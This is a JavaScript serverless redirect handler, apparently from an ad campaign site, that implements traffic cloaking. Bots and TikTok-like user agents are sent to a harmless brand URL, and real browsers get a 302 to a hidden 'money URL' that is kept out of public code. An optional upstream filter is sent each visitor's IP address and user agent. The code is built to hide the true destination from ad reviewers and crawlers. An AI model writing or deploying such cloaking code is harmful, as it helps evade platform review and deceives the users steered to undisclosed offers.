/**
 * Final exit. Money URL never appears in public HTML/JS.
 * Bots / TikTok-like UAs always get Factor75.
 * Real browsers get 302 to the offer (Referrer-Policy: no-referrer).
 */
import { isBotLike, SAFE_URL, pickMoneyUrl } from "../_lib/bot.js";

function redirect(url) {
  return new Response(null, {
    status: 302,
    headers: {
      Location: url,
      "Cache-Control": "no-store, no-cache, must-revalidate",
      "Referrer-Policy": "no-referrer",
      "X-Robots-Tag": "noindex, nofollow, noarchive, nosnippet, noimageindex",
    },
  });
}

export async function onRequestGet(context) {
  const { request, env } = context;
  const ua = request.headers.get("user-agent") || "";

  if (isBotLike(ua)) {
    return redirect(SAFE_URL);
  }

  // Same optional upstream filter as /api/s — if set and denies, safe path only
  const upstream = (env && env.CHECK_UPSTREAM) || "";
  if (upstream) {
    try {
      const res = await fetch(upstream, {
        method: "POST",
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": ua,
          "x-forwarded-for": request.headers.get("cf-connecting-ip") || "",
        },
        body:
          "rui=/api/go&sn=" +
          encodeURIComponent(new URL(request.url).hostname),
      });
      const text = await res.text();
      const allowMoney = /location\.(href|replace|assign)|window\.location/i.test(
        text
      );
      if (!allowMoney) return redirect(SAFE_URL);
    } catch {
      return redirect(SAFE_URL);
    }
  }

  return redirect(pickMoneyUrl(env));
}

export async function onRequestHead(context) {
  return onRequestGet(context);
}
